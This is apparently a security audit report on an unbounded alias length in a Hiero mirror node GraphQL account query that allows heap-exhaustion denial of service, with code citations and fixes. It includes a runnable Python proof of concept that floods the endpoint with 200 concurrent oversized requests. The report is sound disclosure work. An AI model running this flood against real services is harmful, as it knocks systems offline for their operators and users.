### Title
Missing Alias Length Constraint Enables Heap Exhaustion DoS via `decodeBase32()` in GraphQL Account Query

### Summary
The `alias` field in `AccountInput` is constrained only by a character-set regex (`^[A-Z2-7]+$`) with no maximum length limit. Any unauthenticated caller can submit arbitrarily long valid Base32 strings that pass schema validation and are forwarded directly to `BASE32.decode()` in `GraphQlUtils.decodeBase32()`, which allocates a byte array proportional to the input length. Flooding the endpoint with concurrent oversized alias queries causes unbounded heap allocation, leading to GC pressure and eventual OOM-triggered service restart.

### Finding Description

**Schema — no length constraint:** [1](#0-0) 

```graphql
alias: String @Pattern(regexp: "^[A-Z2-7]+$")
```

The only directive applied is `@Pattern`, which validates the character set. The `directive.graphqls` file defines only `@Min` and `@Pattern` — no `@Size` or equivalent length-bounding directive exists anywhere in the schema. [2](#0-1) 

**Unbounded decode — no length guard:** [3](#0-2) 

`BASE32.decode(base32)` (Apache Commons Codec) allocates a `byte[]` of size ≈ `input_length × 5 / 8` with no pre-check on `input_length`.

**Call chain — no interception:** [4](#0-3) 

`getByAliasAndType()` calls `decodeBase32(alias)` directly. The controller applies `@Valid` on `AccountInput`, but Bean Validation only enforces the `@Pattern` charset check — length is never evaluated. [5](#0-4) 

**Exploit flow:**
1. Attacker constructs a GraphQL POST body with `alias` set to a string of `N` valid Base32 characters (e.g., `"AAAA…"` repeated to fill the HTTP request body limit, typically ~2 MB).
2. The `@Pattern` check passes — all characters are in `[A-Z2-7]`.
3. `decodeBase32()` allocates a `byte[]` of ~1.25 MB per request.
4. The decoded bytes are passed to `entityRepository.findByAlias()` — a DB round-trip that adds latency, keeping the allocation live longer.
5. Sending hundreds of concurrent such requests exhausts the JVM heap.

### Impact Explanation
Each request with a ~2 MB alias string causes ~1.25 MB of heap allocation that remains live until the DB query completes. With sufficient concurrency (e.g., 200 threads × 1.25 MB = 250 MB), the JVM heap is exhausted, triggering an `OutOfMemoryError` and a service restart. This is a complete availability loss for the GraphQL API with no data exfiltration required and no authentication needed.

### Likelihood Explanation
The GraphQL endpoint is publicly reachable with no authentication visible in the codebase. The attack requires only a standard HTTP client capable of sending concurrent POST requests. The payload is trivially constructed (a long string of `A` characters). No special knowledge of the system is required. The attack is repeatable — each restart cycle can be immediately re-triggered.

### Recommendation
1. **Add a `@Size` directive** to the GraphQL schema and enforce it:
   ```graphql
   alias: String @Pattern(regexp: "^[A-Z2-7]+$") @Size(max: 128)
   ```
   Define the `@Size` directive in `directive.graphqls` and wire it to a `graphql-java-extended-validation` rule.
2. **Add an explicit length guard** in `decodeBase32()` or `getByAliasAndType()`:
   ```java
   if (alias != null && alias.length() > 128) {
       throw new IllegalArgumentException("Alias exceeds maximum length");
   }
   ```
3. **Apply HTTP-layer request size limits** in the Spring Boot configuration to bound the maximum POST body size.
4. **Add rate limiting** on the GraphQL endpoint to limit requests per IP.

### Proof of Concept
```python
import requests, threading

URL = "http://<graphql-host>/graphql"
# 1,600,000 valid Base32 chars → ~1 MB decoded per request
ALIAS = "A" * 1_600_000
QUERY = """
query {
  account(input: { alias: "%s" }) {
    entityId { num }
  }
}
""" % ALIAS

def send():
    requests.post(URL, json={"query": QUERY}, timeout=30)

# 200 concurrent requests → ~200 MB heap allocation simultaneously
threads = [threading.Thread(target=send) for _ in range(200)]
for t in threads: t.start()
for t in threads: t.join()
# Expected result: service OOM / restart
```

**Preconditions:** Network access to the GraphQL endpoint; no credentials required.
**Trigger:** Execute the script above.
**Result:** JVM heap exhaustion → `OutOfMemoryError` → service restart.

### Citations

**File:** graphql/src/main/resources/graphql/account.graphqls (L89-90)
```text
    "A RFC 4648 Base32, with the trailing '=' characters removed, string that represents an account alias."
    alias: String @Pattern(regexp: "^[A-Z2-7]+$")
```

**File:** graphql/src/main/resources/graphql/directive.graphqls (L1-7)
```text
"Validation directive that ensures the argument or input is a certain minimum value."
directive @Min(value : Int! = 0, message : String = "graphql.validation.Min.message")
on ARGUMENT_DEFINITION | INPUT_FIELD_DEFINITION

"Validation directive that ensures the argument or input value matches the given regular expression."
directive @Pattern(regexp : String! =".*", message : String = "graphql.validation.Pattern.message")
on ARGUMENT_DEFINITION | INPUT_FIELD_DEFINITION
```

**File:** graphql/src/main/java/org/hiero/mirror/graphql/util/GraphQlUtils.java (L83-85)
```java
    public static byte[] decodeBase32(String base32) {
        return BASE32.decode(base32);
    }
```

**File:** graphql/src/main/java/org/hiero/mirror/graphql/service/EntityServiceImpl.java (L29-31)
```java
    public Optional<Entity> getByAliasAndType(String alias, EntityType type) {
        return entityRepository.findByAlias(decodeBase32(alias)).filter(e -> e.getType() == type);
    }
```

**File:** graphql/src/main/java/org/hiero/mirror/graphql/controller/AccountController.java (L33-48)
```java
    Optional<Account> account(@Argument @Valid AccountInput input) {
        final var alias = input.getAlias();
        final var evmAddress = input.getEvmAddress();
        final var entityId = input.getEntityId();
        final var id = input.getId();

        validateOneOf(alias, entityId, evmAddress, id);

        if (entityId != null) {
            return entityService
                    .getByIdAndType(toEntityId(entityId), EntityType.ACCOUNT)
                    .map(accountMapper::map);
        }

        if (alias != null) {
            return entityService.getByAliasAndType(alias, EntityType.ACCOUNT).map(accountMapper::map);
```
